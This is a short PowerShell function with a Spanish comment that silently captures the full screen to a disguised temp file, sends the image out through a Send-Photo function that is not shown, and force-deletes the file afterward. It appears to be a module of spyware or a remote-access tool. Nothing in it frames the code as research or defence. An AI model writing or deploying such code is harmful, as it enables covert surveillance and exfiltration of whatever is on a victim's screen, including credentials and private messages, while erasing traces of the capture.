# Envía una screenshot
function screenshot{
    $File = "$((Get-ChildItem env:LOCALAPPDATA).value)\Temp\e739b683-e1b0-48f8-aa60-b779aaaca5db.tmp"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($File) 
    Send-Photo -File $File
    rm -Path $File -Force
}
